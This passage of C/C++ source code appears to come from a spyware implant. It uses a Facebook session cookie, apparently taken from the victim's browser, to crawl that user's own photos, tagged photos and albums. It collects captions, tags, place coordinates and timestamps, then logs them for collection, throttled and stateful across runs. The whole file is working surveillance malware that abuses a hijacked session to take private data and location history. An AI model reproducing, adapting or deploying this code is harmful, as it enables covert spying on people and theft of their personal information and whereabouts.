	LPSTR strTags = FacebookPhotoExtractPhotoTags(facebookPhotoPageSanitized);
	
	/*	e] optional - location */
	LPSTR strLocation = FacebookPhotoExtractPhotoLocation(strCookie, facebookPhotoPageSanitized, idToLocation_hash_head);

	/*  f] optional - timestamp */
	LPSTR strEpochTimestamp = FacebookPhotoExtractTimestamp(facebookPhotoPageSanitized);

	/* log all the things */
	FacebookPhotoLog(strRecvPhoto, uSize, strCaption, strTags, strLocation, strPhotoBlobPath, strEpochTimestamp);

	/* cleanup */
	if (strRecvPhoto)
		zfree_s(strRecvPhoto);

	if (strPhotoBlobPath)
		zfree_s(strPhotoBlobPath);

	if (strCaption)
		zfree_s(strCaption);

	if (strTags)
		zfree_s(strTags);

	if (strLocation)
		zfree_s(strLocation);
	
	if (strEpochTimestamp)
		zfree_s(strEpochTimestamp);

	zfree_s(strRecvBuffer);
	zfree_s(facebookPhotoPageSanitized);
}

/*
	Description:	parse StrContainingFbids and inserts fbids found into hash_head
	Params:			string containg fbids, pointer to hash head, type of fbid
	Usage:			new fbids are allocated and inserted into hash_head, StrContainingFbids temporarily changed 
*/
VOID FacebookPhotoExtractFbidsFromPage(__in LPSTR StrContainingFbids, facebook_photo_id **hash_head, DWORD dwFbidType)
{
	LPSTR strPhotoParser1, strPhotoParser2;
	CHAR strFbid[32]; 

	strPhotoParser1 = StrContainingFbids;
	while (TRUE)
	{
		strPhotoParser1 = strstr(strPhotoParser1, FBID_TAG);
		if (!strPhotoParser1)
			break;

		strPhotoParser1 += strlen(FBID_TAG);

		strPhotoParser2 = strstr(strPhotoParser1, "\"");
		if (!strPhotoParser2)
			break;

		*strPhotoParser2 = NULL;
		_snprintf_s(strFbid, sizeof(strFbid), "%s", strPhotoParser1);
		strPhotoParser1 = strPhotoParser2 + 1;

		facebook_photo_id *fbid_new = (facebook_photo_id*) zalloc_s(sizeof(facebook_photo_id));
		fbid_new->fbid = _strtoui64(strFbid, NULL, 10);
		fbid_new->dwType = dwFbidType;


		facebook_photo_id *fbid_tmp = NULL;
		HASH_FIND(hh, *hash_head, &fbid_new->fbid, sizeof(UINT64), fbid_tmp);

		if (fbid_tmp == NULL) {
			HASH_ADD(hh, *hash_head, fbid, sizeof(UINT64), fbid_new);
		} else {
			zfree_s(fbid_new);
		}

	}
		
}

/*
	Description:	crawls from strPageContainingToken and inserts fbids found into hash_head
	Params:			valid Facebook cookie, Facebook user id, page containing TaggedPhotosAppCollectionPagelet token, pointer to hash head
	Usage:			new fbids are allocated and inserted into hash_head, strPageContainingToken temporarily changed 
*/
VOID FacebookPhotoCrawlPhotosOfYou(__in LPSTR strCookie, __in LPSTR strUserId, __in LPSTR strPageContainingToken, facebook_photo_id **hash_head)
{
	
	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/*  Photos of You, e.g.:
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695%3A2305272732%3A4
		"controller": "TaggedPhotosAppCollectionPagelet"
		...
		"token": "100006576075695:2305272732:4", // using token 
		"href": "https:\/\/www.facebook.com\/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695\u00253A2305272732\u00253A4", // ignore href, don't want to json unescape 
	*/

	/* a] fetch page with fbids */
	strParser1 = strstr(strPageContainingToken, "\"TaggedPhotosAppCollectionPagelet\"");
	if (!strParser1)
		return;

	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
		return;

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)
		return;
	
	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;
	
	LPWSTR strUrlPhotos = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlPhotos)
		return;

	_snwprintf_s(strUrlPhotos, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore input page */
	*strParser2 = chTmp;


	LPSTR strRecvPhotoBuffer = NULL;
	DWORD dwBuffSize = 0;
	CheckProcessStatus();
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlPhotos, 443, NULL, 0, (LPBYTE *)&strRecvPhotoBuffer, &dwBuffSize, strCookie);
	

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree_s(strUrlPhotos);
		return;
	}

	/*	b] collect fbids 
		e.g. data-fbid="1588556341373553">
	*/

	FacebookPhotoExtractFbidsFromPage(strRecvPhotoBuffer, hash_head, PHOTOS_OF_YOU);
	
	/* cleanup */
	zfree_s(strRecvPhotoBuffer);
	zfree_s(strUrlPhotos);	
}

/*
	Description:	crawls from strPageContainingToken and inserts fbids found into hash_head
	Params:			valid Facebook cookie, Facebook user id, page containing AllPhotosAppCollectionPagelet token, pointer to hash head
	Usage:			new fbids are allocated and inserted into hash_head, strPageContainingToken temporarily changed

*/
VOID FacebookPhotoCrawlYourPhotos(__in LPSTR strCookie, __in LPSTR strUserId, __in LPSTR strPageContainingToken, facebook_photo_id **hash_head)
{
	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/*  2] Your Photos, e.g.:
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695%3A2305272732%3A5
		"controller": "AllPhotosAppCollectionPagelet"
	*/

	/* 2a] fetch page with fbids */
	strParser1 = strstr(strPageContainingToken, "\"AllPhotosAppCollectionPagelet\"");
	if (!strParser1)
		return;

	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
		return;

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)

		return;
	
	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;
	
	LPWSTR strUrlPhotos = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlPhotos)
		return;

	_snwprintf_s(strUrlPhotos, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore input page */
	*strParser2 = chTmp;


	LPSTR strRecvPhotoBuffer = NULL;
	DWORD dwBuffSize = 0;
	CheckProcessStatus();
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlPhotos, 443, NULL, 0, (LPBYTE *)&strRecvPhotoBuffer, &dwBuffSize, strCookie);
	zfree_s(strUrlPhotos);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return;

	/* 2b] collect fbids 
		e.g. data-fbid="1588556341373553">
	*/

	FacebookPhotoExtractFbidsFromPage(strRecvPhotoBuffer, hash_head, PHOTOS_YOURS);
	zfree_s(strRecvPhotoBuffer);
	
}

/*
	Description:	crawls from strPageContainingToken and inserts fbids found into hash_head
	Params:			valid Facebook cookie, Facebook user id, page containing PhotoAlbumsAppCollectionPagelet and SinglePhotoAlbumAppCollectionPagelet tokens, pointer to hash head
	Usage:			new fbids are allocated and inserted into hash_head, strPageContainingToken temporarily changed

*/
VOID FacebookPhotoCrawlAlbums(__in LPSTR strCookie, __in LPSTR strUserId, __in LPSTR strPageContainingToken, facebook_photo_id **hash_head)
{
	/* allocations:
		- while looping through the albums, an http request is done for each album. The buffer containing such pages
		  is allocated and free'd each time.
	*/

	/*  
		a] "controller": "PhotoAlbumsAppCollectionPagelet" contains the token needed to fetch the albums
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695%3A2305272732%3A6

		b] "controller": "SinglePhotoAlbumAppCollectionPagelet" contains the token needed to later fetch the photo within the albums 
	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/* a] fetch page containing albums links "albumThumbLink" */
	strParser1 = strstr(strPageContainingToken, "\"PhotoAlbumsAppCollectionPagelet\"");
	if (!strParser1)
	{
		return;
	}
	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
	{
		return;
	}

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)
		return;
	
	/* temporary change strPageContainingToken */
	chTmp = *strParser2;
	*strParser2 = NULL;
	
	LPWSTR strUrlAlbums = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlAlbums)
		return;

	_snwprintf_s(strUrlAlbums, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore strPageContainingToken */
	*strParser2 = chTmp;


	DWORD dwBuffSize = 0;
	LPSTR strRecvAlbumsBuffer = NULL;
	CheckProcessStatus();
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlAlbums, 443, NULL, 0, (LPBYTE *)&strRecvAlbumsBuffer, &dwBuffSize, strCookie);
	
	/* reusing later in album fetch loop b] */
	SecureZeroMemory(strUrlAlbums, URL_SIZE_IN_CHARS * sizeof(WCHAR) );

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return;
	

	/* b] find token "SinglePhotoAlbumAppCollectionPagelet", which is needed in stage c] */
	strParser1 = strstr(strPageContainingToken, "\"SinglePhotoAlbumAppCollectionPagelet\"");
	if (!strParser1)
	{
		return;
	}
	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
	{
		return;
	}

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)
		return;
	
	/* temporary change strPageContainingToken */
	chTmp = *strParser2;
	*strParser2 = NULL;

	LPWSTR strUrlSinglePhoto = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlSinglePhoto)
	{
		zfree_s(strUrlAlbums);
		zfree_s(strRecvAlbumsBuffer);
		return;
	}

	_snwprintf_s(strUrlSinglePhoto, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore strPageContainingToken */
	*strParser2 = chTmp;

	/* c] loop through each album and fetch all the fbids */

	/*	album urls example: <a class="albumThumbLink uiMediaThumb uiScrollableThumb" href="https://www.facebook.com/media/set/?set=a.1588543974708123.1073741826.100006576075695&amp;type=3" 
		we need only set=*, the remaining is obtained from SinglePhotoAlbumAppCollectionPagelet 	*/
	
	// TODO: limit the number of albums fetched ?

	strParser1 = strRecvAlbumsBuffer;
	while (TRUE)
	{
		strParser1 = strstr(strParser1, "albumThumbLink");
		if (!strParser1)
			break;

		strParser1 = strstr(strParser1, "set/?");
		if (!strParser1)
			break;

		strParser1 += strlen("set/?");

		/* we need to replace &amp;type=3, with &type=3, atm without calling external functions*/

		strParser2 = strstr(strParser1, "&amp;type=");
		if (!strParser2)
			break;
		
		/* albums url contain "type=3" */
		if (strstr(strParser1, "type=3"))
		{

			/* after we've searched type=3 we can null terminate the string */
			*strParser2 = NULL;


			/* b] for each album fetch contained fbids */
			
			
			_snwprintf_s(strUrlAlbums, URL_SIZE_IN_CHARS, _TRUNCATE, L"%s&%S&type=3", strUrlSinglePhoto, strParser1);

			
			dwBuffSize = 0;
			LPSTR strRecvThisAlbumBuffer = NULL;
			CheckProcessStatus();
			dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlAlbums, 443, NULL, 0, (LPBYTE *) &strRecvThisAlbumBuffer, &dwBuffSize, strCookie);
			
			SecureZeroMemory(strUrlAlbums, URL_SIZE_IN_CHARS * sizeof(WCHAR));
			
			/* if there are issues, bail altogether, we'll retry on next run of the PhotoHandler */
			if (dwRet != SOCIAL_REQUEST_SUCCESS)
				break;

			FacebookPhotoExtractFbidsFromPage(strRecvThisAlbumBuffer, hash_head, PHOTOS_ALBUM);
			
			zfree_s(strRecvThisAlbumBuffer);
		}

		/* prepare for next round */
		strParser1 = strParser2 + 1;
	}
	
	/* cleanup */
	zfree_s(strUrlAlbums);
	zfree_s(strRecvAlbumsBuffer);
	zfree_s(strUrlSinglePhoto);
}

BOOL FacebookPlacesExtractPositions(__in JSONValue *jValue,  __in LPSTR strUserId, facebook_placeId_to_location **hash_head )
{
	/* pretty much a ripoff of FacebookPlacesExtractPosition(__in JSONValue *jValue, __out location_additionalheader_struct *additionalheader, __out BYTE **body, __out DWORD *blen, __in LPSTR strUserId ):position.cpp */
	
	/* get last place timestamp */
	DWORD dwHighestBatchTimestamp = 0;
	CHAR strUsernameForPlaces[512];
	_snprintf_s(strUsernameForPlaces, sizeof(strUsernameForPlaces), _TRUNCATE, "%s-facebookphotopositions", strUserId);
	DWORD dwLastTimestampLow, dwLastTimestampHigh;
	dwLastTimestampLow = GetLastFBTstamp(strUsernameForPlaces, &dwLastTimestampHigh);
	if (dwLastTimestampLow == FB_INVALID_TSTAMP)
		return FALSE;

	/* get the number of locations */
	JSONObject jRoot = jValue->AsObject();
	if (jRoot.find(L"jsmods") != jRoot.end() && jRoot[L"jsmods"]->IsObject())
	{
		JSONObject jJsmods = jRoot[L"jsmods"]->AsObject();

		if (jJsmods.find(L"require") != jJsmods.end() && jJsmods[L"require"]->IsArray())
		{
			JSONArray jRequire = jJsmods[L"require"]->AsArray();

			if ( jRequire.size() > 0 && jRequire.at(0)->IsArray())
			{
				JSONArray jTmp = jRequire.at(0)->AsArray();
				if (jTmp.size() > 3 && jTmp.at(3)->IsArray())
				{
					JSONArray jTmp2 = jTmp.at(3)->AsArray();

					if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
					{
						JSONObject jObj = jTmp2.at(1)->AsObject();
						

						/* jObj contains:
						"stories":[ array with timestamps ],
						"places":[ array with places ],
						"count":4, // number of different places
						"_instanceid":"u_0_44"
						*/

						if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray()) && (jObj[L"stories"]->IsArray() && jObj[L"stories"]->IsArray()))
						{
							JSONArray jPlaces = jObj[L"places"]->AsArray();
							JSONArray jStories = jObj[L"stories"]->AsArray();

							/*  stories element example: {"timestamp":1418910342, .. ,"placeID":133355006713850, ..  }
								places element example:  {"id":133355006713850, "name":"Isle of Skye, Scotland, UK","latitude":57.41219383264, "longitude":-6.1920373066084,"city":814578, "country":"GB"   } 
							*/

							/* loop through stories, for each story find the corresponding place and set the gps record (suboptimal..) */
							for (DWORD i=0; i<jStories.size(); i++)
							{
								if (!jStories.at(i)->IsObject())
									continue;

								UINT64 current_id;
								time_t time = 0;

								/* extract story id and timestamp */
								JSONObject jStory = jStories.at(i)->AsObject();
								if (jStory.find(L"placeID") != jStory.end() && jStory[L"placeID"]->IsNumber())
								{
									current_id = (UINT64) jStory[L"placeID"]->AsNumber();
								}
								
								if (jStory.find(L"timestamp") != jStory.end() && jStory[L"timestamp"]->IsNumber())
								{
									 time = (time_t) jStory[L"timestamp"]->AsNumber();
								}

								
								/* save the most recent timestamp for this batch */
								if (time > dwHighestBatchTimestamp)
									dwHighestBatchTimestamp = time;
								
								/* if it's recent save it otherwise skip this record */
								if (time <= dwLastTimestampLow)
									continue;

								/* find place id in places: suboptimal version loop through each time */
								for (DWORD j=0; j<jPlaces.size(); j++)
								{
									if (!jPlaces.at(j)->IsObject())
										continue;

									UINT64 tmp_id;

									JSONObject jPlace = jPlaces.at(j)->AsObject();
									if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
									{
										tmp_id = (UINT64) jPlace[L"id"]->AsNumber();

										if (tmp_id == current_id)
										{
											/* got our guy, fill a gps position record */

											if (jPlace.find(L"latitude") != jPlace.end() && jPlace[L"latitude"]->IsNumber() &&
												jPlace.find(L"longitude") != jPlace.end() && jPlace[L"longitude"]->IsNumber())
											{

												facebook_placeId_to_location *placeId_new = (facebook_placeId_to_location*) zalloc_s(sizeof(facebook_placeId_to_location));
												placeId_new->placeId = tmp_id;
												placeId_new->latitude =  (FLOAT) jPlace[L"latitude"]->AsNumber();
												placeId_new->longitude = (FLOAT) jPlace[L"longitude"]->AsNumber();

												facebook_placeId_to_location *placeId_tmp = NULL;
												HASH_FIND(hh, *hash_head, &placeId_new->placeId, sizeof(UINT64), placeId_tmp);
												
												if (placeId_tmp == NULL) 
													HASH_ADD(hh, *hash_head, placeId, sizeof(UINT64), placeId_new);
												else
													zfree_s(placeId_new);
											}			

											break;
										} //if (tmp_id == current_id)
									} //if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
								} //for (DWORD j=0; j<jPlaces.size(); j++)
							} //for (DWORD i=0; i<jStories.size(); i++)


							/* save the highest timestamp in the batch */
							if (dwHighestBatchTimestamp > dwLastTimestampLow)
								SetLastFBTstamp(strUsernameForPlaces, dwHighestBatchTimestamp, 0);

						} //if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray())
					} //if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
				}
			}
		}
	}

	/* 	true if *body is not null, otherwise false */
	return TRUE;
}

VOID FacebookPhotoFetchPlaceIdToCoordinate(__in LPSTR strCookie, __in LPSTR strUserId, facebook_placeId_to_location **idToLocation)
{
	/* pretty much a ripoff of FacebookPositionHandler(LPSTR strCookie):position.cpp */
	LPSTR strParser1, strParser2;
	

	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/profile.php?id=%S&sk=map", strUserId);
	
	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); 

	zfree_s(strUrl);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		return;
	}

	/* find the snippet of json we're interested in and give it to the parser */
	strParser1 = strstr(strRecvBuffer, "{\"display_dependency\":[\"pagelet_timeline_medley_inner_map\"]");
	if (!strParser1)
	{
		/* cleanup */
		zfree_s(strRecvBuffer);
		return;
	}

	strParser2 = strstr(strParser1, "})");
	*(strParser2+1) = NULL;


	LPSTR strJson = strParser1;

	JSONValue *jValue = JSON::Parse(strJson);
	if (jValue != NULL && jValue->IsObject())
	{
		FacebookPlacesExtractPositions(jValue, strUserId, idToLocation);
	}

	/* cleanup */
	zfree_s(strRecvBuffer);

	if (jValue)
		delete jValue;

	return;
}

/*
	Description:	Facebook photo handling entry point, extracts Facebook photos and its metadata
	Params:			cookie needed to log into Facebook
	Usage:			-

*/
DWORD HandleFacebookPhoto(__in LPSTR strCookie)
{
	/*	allocations:
			- items of hash_head are allocated by the crawling functions and freed in the handle loop
			- strSocialUsername_* allocated and free'd before the handle loop
	*/


	if (!bPM_PhotosStarted)
			return SOCIAL_REQUEST_NETWORK_PROBLEM;


	/* hash declaration */
	facebook_photo_id *hash_head = NULL;
	
	
	LPSTR strUserId, strScreenName;

	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
		return SOCIAL_REQUEST_BAD_COOKIE;

	
	/*  0] fetch Photo page, e.g.:
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos

		- get collection_tokens, the tidbit in the URL that differentiate between Photos of You, Your Photo and Albums 
	    - from each page collect the fbid, which identifies a photo univocally
	*/

	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS *sizeof(WCHAR));
	if (!strUrl)
		return SOCIAL_REQUEST_BAD_COOKIE;

	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS , _TRUNCATE, L"/profile.php?id=%S&sk=photos", strUserId);

	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	CheckProcessStatus();
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie);
	
	zfree_s(strUrl); 
	

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree_s(strScreenName);
		zfree_s(strUserId);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}


	/* 1] Your Photos */
	// N.B.:
	// - must stay on top, since it will avoid any clash with fbids
	FacebookPhotoCrawlYourPhotos(strCookie, strUserId, strRecvBuffer, &hash_head);

	/* 2] Photos of You */
	FacebookPhotoCrawlPhotosOfYou(strCookie, strUserId, strRecvBuffer, &hash_head);

	/* 3] Albums */
	// photos from album managed by two users are found only in Albums
	// N.B.:
	// - it must follow "Your Photos"
	// - some photos posted by other users sharing an album might be missing
	FacebookPhotoCrawlAlbums(strCookie, strUserId, strRecvBuffer, &hash_head);
	
	/* 4] if there are some photos fetch pre-emptively the map pages containing 
		  the mapping place_id -> coordinates */
	facebook_placeId_to_location *idToLocation_hash_head = NULL;

	if (HASH_COUNT(hash_head) > 0 )
		FacebookPhotoFetchPlaceIdToCoordinate(strCookie, strUserId, &idToLocation_hash_head);	

	/* 5] Once we've collected all the fbids, 'handle' the photos */
	facebook_photo_id *fbid_tmp, *fbid_current;


	// 0 -> PHOTOS_YOURS
	// 1 -> PHOTOS_OF_YOU
	// 2 -> PHOTOS_ALBUM
	DWORD dwMaxItemsPerRun_0 = 30, dwMaxItemsPerRun_1 = 30, dwMaxItemsPerRun_2 = 30;;
	DWORD dwCurrentItemsPerRun_0 = 0, dwCurrentItemsPerRun_1 = 0, dwCurrentItemsPerRun_2 = 0;
	UINT64 highestBatchFbid_0 = 0, highestBatchFbid_1 = 0, highestBatchFbid_2 = 0;

	size_t strUsernameSize = strlen(strUserId) + strlen("_photos_1") + 1;
	LPSTR strSocialUsername_0 = (LPSTR) zalloc_s(strUsernameSize);
	LPSTR strSocialUsername_1 = (LPSTR) zalloc_s(strUsernameSize);
	LPSTR strSocialUsername_2 = (LPSTR) zalloc_s(strUsernameSize);

	if (strSocialUsername_0 && strSocialUsername_1 && strSocialUsername_2)
	{
		_snprintf_s(strSocialUsername_0, strUsernameSize, _TRUNCATE, "%s_photos_0", strUserId);
		_snprintf_s(strSocialUsername_1, strUsernameSize, _TRUNCATE, "%s_photos_1", strUserId);
		_snprintf_s(strSocialUsername_2, strUsernameSize, _TRUNCATE, "%s_photos_2", strUserId);

		// get saved highest timestamp  for both the sets
		UINT64 savedHighestBatchFbid_0 = SocialGetLastMessageId(strSocialUsername_0);
		UINT64 savedHighestBatchFbid_1 = SocialGetLastMessageId(strSocialUsername_1);
		UINT64 savedHighestBatchFbid_2 = SocialGetLastMessageId(strSocialUsername_2);

		
		// loop through the 2 sets and select the candidates for each set, i.e. filter
		HASH_ITER(hh, hash_head, fbid_current, fbid_tmp) {

			// set PHOTOS_YOURS
			if (fbid_current->dwType == PHOTOS_YOURS)
			{
				
				if (fbid_current->fbid > savedHighestBatchFbid_0 && 
					dwCurrentItemsPerRun_0 < dwMaxItemsPerRun_0 )
				{
					// handle the photo
					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current, idToLocation_hash_head);
					dwCurrentItemsPerRun_0 +=1;

					// update highest batch fbid in case
					if (fbid_current->fbid > highestBatchFbid_0)
						highestBatchFbid_0 = fbid_current->fbid;

				}
			}
			// set PHOTOS_OF_YOU
			else if (fbid_current->dwType == PHOTOS_OF_YOU)
			{
				if (fbid_current->fbid > savedHighestBatchFbid_1 && 
					dwCurrentItemsPerRun_1 < dwMaxItemsPerRun_1 )
				{
					// handle the photo
					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current, idToLocation_hash_head);
					dwCurrentItemsPerRun_1 +=1;

					// update highest batch fbid in case
					if (fbid_current->fbid > highestBatchFbid_1)
						highestBatchFbid_1 = fbid_current->fbid;
				}
			}
			// set PHOTOS_ALBUM
			else if (fbid_current->dwType == PHOTOS_ALBUM)
			{
				if (fbid_current->fbid > savedHighestBatchFbid_2 && 
					dwCurrentItemsPerRun_2 < dwMaxItemsPerRun_2 )
				{
					// handle the photo
					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current,  idToLocation_hash_head);
					dwCurrentItemsPerRun_2 +=1;

					// update highest batch fbid in case
					if (fbid_current->fbid > highestBatchFbid_2)
						highestBatchFbid_2 = fbid_current->fbid;
				}
			}

		
			// remove the photo from the hash
			HASH_DEL(hash_head, fbid_current);
			zfree_s(fbid_current);
		}

		// update highest fbid if needed
		if (highestBatchFbid_0 > savedHighestBatchFbid_0)
			SocialSetLastMessageId(strSocialUsername_0, highestBatchFbid_0 );

		if (highestBatchFbid_1 > savedHighestBatchFbid_1)
			SocialSetLastMessageId(strSocialUsername_1, highestBatchFbid_1 );
	
		if (highestBatchFbid_2 > savedHighestBatchFbid_2)
			SocialSetLastMessageId(strSocialUsername_2, highestBatchFbid_2 );

		// free facebook_placeId_to_location *idToLocation
		facebook_placeId_to_location *placeId_tmp, *placeId_current;
		HASH_ITER(hh, idToLocation_hash_head, placeId_current, placeId_tmp)
		{
			HASH_DEL(idToLocation_hash_head, placeId_current);
			zfree_s(placeId_current);
		}


		zfree_s(strSocialUsername_0);
		zfree_s(strSocialUsername_1);
		zfree_s(strSocialUsername_2);
	}
	

	/* cleanup */
	zfree_s(strScreenName);
	zfree_s(strUserId);
	zfree_s(strRecvBuffer);
	return SOCIAL_REQUEST_SUCCESS;
}